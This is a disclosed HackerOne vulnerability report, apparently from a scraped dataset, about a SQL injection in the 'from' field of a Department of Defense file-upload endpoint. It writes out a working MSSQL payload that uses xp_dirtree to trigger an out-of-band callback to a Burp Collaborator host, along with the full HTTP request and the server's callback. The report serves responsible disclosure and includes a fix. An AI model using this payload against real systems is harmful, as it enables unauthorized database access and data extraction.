---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '272506'
original_report_id: '272506'
title: SQL injections
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2017-09-27T21:36:33.009Z'
disclosed_at: '2019-10-04T15:19:56.603Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- sql-injection
---

# SQL injections

## Metadata

- HackerOne Report ID: 272506
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-10-04T15:19:56.603Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
An email is not well handeled and leads to sql injection.
**Description:**
This request
POST /FileTransfer/Upload HTTP/1.1
Host: www.███████

The parameter **from** is injectable and leads to valid sql injection.
## Impact
I didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user.

## Step-by-step Reproduction Instructions
Payload injection 
```
';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
```

Request to make execute the sql command 
```
POST /FileTransfer/Upload HTTP/1.1
Host: www.███
Connection: close
Content-Length: 269
Cache-Control: max-age=0
Origin: https://www.████
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: https://www.█████████/FileTransfer/
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4

------WebKitFormBoundarybjrDo2DV1yHQWvAQ
Content-Disposition: form-data; name="from"

hello';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
------WebKitFormBoundarybjrDo2DV1yHQWvAQ
```

first I get a dns query on my burp collaborator (see sqli2.png)

second I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55
```
PROPFIND /random HTTP/1.1
Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
Content-Length: 0
Depth: 0
translate: f
User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
X-BlueCoat-Via: ██████████
```

Also it is easy to see that the single quote breaks the sql syntax.

## Suggested Mitigation/Remediation Actions
Make prepared statement so the **'** doesnt get interpreted. (Input data validation)
Maybe verify other parameters.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
